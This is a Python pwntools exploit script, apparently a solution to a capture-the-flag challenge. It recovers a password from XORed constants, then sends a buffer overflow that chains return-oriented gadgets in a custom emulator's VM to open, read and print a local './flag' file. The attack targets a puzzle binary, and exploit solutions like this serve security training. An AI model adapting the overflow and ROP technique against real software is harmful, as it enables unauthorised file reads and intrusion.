#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.log_level = "debug"

gdbscript = '''
add-symbol-file struct.o 0\n
set $vm=0x555555768260\n
b *0x555555565803\n
b *0x555555565893\n
b *0x555555565643\n
b *0x5555555656d3\n
# open\n
b *0x55555556545b\n
\n
# break call 0xc1a\n
b *0x555555565e6c if (*(struct VM*)$vm).pc == 0x5b1\n
disable 5 6\n
define pvm\n
print *(struct VM*)$vm\n
end
'''

if sys.argv[1] == 'd':
    io = gdb.debug(args=["./emulator", "./test.bin"], aslr=False, gdbscript=gdbscript)
else:
    io = process(argv=["./emulator", "./test.bin"])

password = "QWQ"

data = [0x427234129827abcd^0x10240740dc179b8a,
        0x127412341241dead^0x213a22705e70edfa,
        0x8634965812abc123^0xa75ae10820d2b377,
        0x123216781236789a^0x5d75593f5d7137dd]

for e in data:
    while e != 0:
        password += chr(e & 0xff)
        e = e >> 8

print(password)

io.sendafter("password: \n", password)

# gdb.attach(io)

# payload = cyclic(0x800)
# io.sendafter("GOGO!\n", payload)
'''
0x7f008d8ce010

00:0000│   0x7f008d8ddef0 ◂— 0x574f4e54494e5750 ('PWNITNOW')
01:0008│   0x7f008d8ddef8 ◂— 0xa214f474f4721 /* '!GOGO!\n' */
02:0010│   0x7f008d8ddf00 ◂— 0x6161616261616161 ('aaaabaaa') 
03:0018│   0x7f008d8ddf08 ◂— 0x6161616461616163 ('caaadaaa')
04:0020│   0x7f008d8ddf10 ◂— 0x6161616661616165 ('eaaafaaa')
05:0028│   0x7f008d8ddf18 ◂— 0x6161616861616167 ('gaaahaaa')
06:0030│   0x7f008d8ddf20 ◂— 0x6161616a61616169 ('iaaajaaa')
07:0038│   0x7f008d8ddf28 ◂— 0x6161616c6161616b ('kaaalaaa')
'''

# 0x0d 0xR6 0x00 0x11 0xRR
pop_r00_ret = 0x2f5         # 0x46
# 0x0d 0xR6 0x01 0X11 0xRR
pop_r01_ret = 0x377         # 0x46
# 0x0d 0xR6 0x02 0x11 0xRR
pop_r02_ret = 0x45c         # 0x46
# 0x0d 0xR6 0x03 0x11 0xRR
pop_r03_ret = 0x4e1         # 0x46

# 0x20 0x0a 0x11 0xRR
sys_open_ret = 0x6ed
# 0x20 0xR8 0x11 0xRR
sys_data_ret = 0x5b1
# 0x20 0xR9 0x11 0xRR
sys_stack_ret = 0x617

payload = b"A"*0x108
# read(0, data[0x100], 0x20)
# r00 = 1 r01 = 0 r02 = 0x100 r03 = 0x20
payload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x20)
payload += p64(sys_data_ret)

# open(data[0x100], 0)
# r00 = 0 r01 = 0x200 r02 = 0
payload += p64(pop_r00_ret) + p64(0) + p64(pop_r01_ret) + p64(0x100) + p64(pop_r02_ret) + p64(0)
payload += p64(sys_open_ret)

# read(4, data[0x100], 0x30)
# r00 = 1 r01 = 4 r02 = 0x100 r03 = 0x30
payload += p64(pop_r00_ret) + p64(1) + p64(pop_r01_ret) + p64(0x4) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)
payload += p64(sys_data_ret)

# write(1, data[0x100], 0x30)
# r00 = 2 r01 = 1 r02 = 0x100 r03 = 0x30
payload += p64(pop_r00_ret) + p64(2) + p64(pop_r01_ret) + p64(0x1) + p64(pop_r02_ret) + p64(0x100) + p64(pop_r03_ret) + p64(0x30)
payload += p64(sys_data_ret)

payload += b"##@@..@@"


io.sendlineafter("GOGO!\n", payload)

# sleep(0.03)

io.sendafter("##@@..@@\n", "./flag\x00")

io.interactive()
io.close()
